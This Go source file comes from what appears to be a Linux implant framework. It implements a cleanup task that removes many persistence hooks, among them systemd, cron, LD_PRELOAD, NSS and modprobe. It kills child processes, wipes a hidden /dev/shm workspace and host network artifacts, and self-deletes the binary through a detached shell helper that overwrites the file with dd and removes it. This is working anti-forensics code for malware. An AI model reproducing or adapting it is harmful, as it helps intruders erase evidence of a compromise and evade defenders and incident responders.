package tasking

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/namespace"
	"github.com/Real-Fruit-Snacks/Aquifer/pkg/opsec"
)

// Cleanup performs a full cleanup of the implant: removes persistence,
// securely deletes the binary, cleans workspace, removes namespace artifacts,
// and kills child processes. args["scope"] can be "full" (default), "persist",
// "binary", or "workspace".
func Cleanup(task config.Task) ([]byte, error) {
	scope := task.Args["scope"]
	if scope == "" {
		scope = "full"
	}

	type CleanupResult struct {
		Scope   string   `json:"scope"`
		Actions []string `json:"actions"`
		Errors  []string `json:"errors"`
	}

	result := CleanupResult{Scope: scope}

	addAction := func(msg string) {
		result.Actions = append(result.Actions, msg)
	}
	addError := func(msg string) {
		result.Errors = append(result.Errors, msg)
	}

	// Step 1: Remove all persistence mechanisms (basic + advanced).
	if scope == "full" || scope == "persist" {
		methods := []string{
			PersistSystemd, PersistCron, PersistBashRC,
			PersistSystemdTimer, PersistInitD, PersistUdev, PersistLDPreload,
			PersistGenerator, PersistNSS, PersistLogrotate, PersistDhclient,
			PersistApt, PersistNMDispatch, PersistAudisp, PersistBinfmt, PersistModprobe,
			PersistSysctl,
		}
		for _, m := range methods {
			if err := RemovePersistence(m); err != nil {
				addError(fmt.Sprintf("persist/%s: %v", m, err))
			} else {
				addAction(fmt.Sprintf("removed persistence: %s", m))
			}
		}
	}

	// Step 2: Kill child processes.
	if scope == "full" {
		killed := killChildProcesses()
		addAction(fmt.Sprintf("killed %d child processes", killed))
	}

	// Step 3: Remove host-side network artifacts (veth, iptables, sysctl).
	// Best-effort: may fail from inside a network namespace, but succeeds
	// if cleanup is triggered from the host context.
	if scope == "full" {
		namespace.CleanupHostNetwork()
		addAction("cleaned host network artifacts (veth, iptables, sysctl)")
	}

	// Step 4: Clean tmpfs workspace.
	if scope == "full" || scope == "workspace" {
		workDir := task.Args["workdir"]
		if workDir == "" {
			workDir = "/dev/shm/.x11"
		}

		// Validate workDir is within expected tmpfs locations to prevent
		// a malicious C2 response from triggering arbitrary path deletion.
		cleanPath := filepath.Clean(workDir)
		// Resolve symlinks before prefix check to prevent symlink traversal attacks.
		resolvedPath, err := filepath.EvalSymlinks(cleanPath)
		if err != nil {
			resolvedPath = cleanPath // fall through to rejection if unresolvable
			addError(fmt.Sprintf("workspace: refusing unresolvable path: %s", cleanPath))
		} else {
			cleanPath = resolvedPath
		}
		allowedPrefixes := []string{"/dev/shm/", "/tmp/", "/run/"}
		allowed := false
		if err == nil {
			for _, p := range allowedPrefixes {
				if strings.HasPrefix(cleanPath+"/", p) {
					allowed = true
					break
				}
			}
		}
		if !allowed {
			addError(fmt.Sprintf("workspace: refusing unsafe path: %s", cleanPath))
		} else if err := cleanWorkspace(cleanPath); err != nil {
			addError(fmt.Sprintf("workspace: %v", err))
		} else {
			addAction(fmt.Sprintf("cleaned workspace: %s", cleanPath))
		}
	}

	// Step 5: Remove namespace artifacts (cgroups, tmp files, netns).
	if scope == "full" {
		namespace.CleanupCgroups()

		artifacts := []string{
			"/tmp/.ns_*",
			"/run/netns/implant_*",
		}
		for _, pattern := range artifacts {
			matches, _ := filepath.Glob(pattern)
			for _, match := range matches {
				info, err := os.Lstat(match)
				if err != nil {
					continue
				}
				if info.Mode()&os.ModeSymlink != 0 {
					os.Remove(match) // remove symlink itself, don't follow
					continue
				}
				os.RemoveAll(match)
			}
		}
		addAction("removed namespace artifacts (cgroups, tmp, netns)")
	}

	// Step 6: Secure delete the implant binary.
	if scope == "full" || scope == "binary" {
		if err := SelfDelete(); err != nil {
			addError(fmt.Sprintf("self-delete: %v", err))
		} else {
			addAction("binary self-delete initiated")
		}
	}

	return json.Marshal(result)
}

// SecureDelete overwrites a file three times with random data, then removes it.
// This makes simple file recovery more difficult (though not impossible on
// journaled filesystems or SSDs with wear leveling).
// Delegates to opsec.SecureDelete to avoid duplicate implementations.
func SecureDelete(path string) error {
	return opsec.SecureDelete(path)
}

// SelfDelete deletes the running implant binary. It forks a short-lived
// helper process that waits for the parent to exit, then unlinks the binary.
// Uses /proc/self/exe to resolve the actual path.
func SelfDelete() error {
	exePath, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("self_delete: resolve exe: %w", err)
	}

	// Verify the path exists and is a regular file.
	info, err := os.Lstat(exePath)
	if err != nil {
		return fmt.Errorf("self_delete: stat exe: %w", err)
	}
	if !info.Mode().IsRegular() {
		return fmt.Errorf("self_delete: %s is not a regular file", exePath)
	}

	// Validate exePath contains no shell metacharacters to prevent injection.
	if strings.ContainsAny(exePath, "'\"$`\\!;|&(){}") {
		return fmt.Errorf("self_delete: refusing path with shell metacharacters: %s", exePath)
	}

	pid := os.Getpid()

	// Fork a helper process that waits for us to exit, then securely deletes the binary.
	// We use a small shell script executed via /bin/sh that:
	// 1. Waits for the parent PID to disappear
	// 2. Overwrites the binary with random data
	// 3. Removes the file
	script := fmt.Sprintf(
		`(while kill -0 %d 2>/dev/null; do sleep 0.1; done; `+
			`dd if=/dev/urandom of='%s' bs=4096 count=$(( $(stat -c %%s '%s' 2>/dev/null || echo 4096) / 4096 + 1 )) conv=notrunc 2>/dev/null; `+
			`rm -f '%s') &`,
		pid, exePath, exePath, exePath,
	)

	// Launch the cleanup helper detached.
	attr := &syscall.ProcAttr{
		Dir:   "/",
		Env:   []string{"PATH=/usr/bin:/bin"},
		Files: []uintptr{0, 0, 0},
		Sys: &syscall.SysProcAttr{
			Setsid: true, // New session so it survives parent exit.
		},
	}

	childPid, err := syscall.ForkExec("/bin/sh", []string{"/bin/sh", "-c", script}, attr)
	if err != nil {
		return fmt.Errorf("self_delete: fork helper failed: %w", err)
	}
	_ = childPid

	return nil
}

// killChildProcesses sends SIGKILL to all child processes of the current PID.
// Returns the number of processes killed.
func killChildProcesses() int {
	myPID := os.Getpid()
	myPIDStr := strconv.Itoa(myPID)
	killed := 0

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid == myPID || pid == 1 {
			continue
		}

		// Check if this process is our child by reading its PPid.
		statusPath := filepath.Join("/proc", entry.Name(), "status")
		data, err := os.ReadFile(statusPath)
		if err != nil {
			continue
		}

		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "PPid:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 && fields[1] == myPIDStr {
					if proc, err := os.FindProcess(pid); err == nil {
						proc.Signal(syscall.SIGKILL)
						killed++
					}
				}
				break
			}
		}
	}

	// Brief pause to let signals propagate.
	time.Sleep(100 * time.Millisecond)
	return killed
}

// cleanWorkspace securely removes the tmpfs workspace directory and all contents.
func cleanWorkspace(workDir string) error {
	// Walk and overwrite all files before removing the directory.
	// filepath.WalkDir does NOT follow symlinks (unlike filepath.Walk).
	filepath.WalkDir(workDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // skip inaccessible
		}
		if d.IsDir() {
			return nil
		}
		if d.Type()&os.ModeSymlink != 0 {
			return nil // skip symlinks
		}
		info, err := d.Info()
		if err != nil {
			return nil
		}
		if info.Size() > 0 {
			SecureDelete(path)
		}
		return nil
	})

	// Remove the directory tree (SecureDelete already removed individual files,
	// but there may be empty dirs or files that failed secure delete).
	return os.RemoveAll(workDir)
}
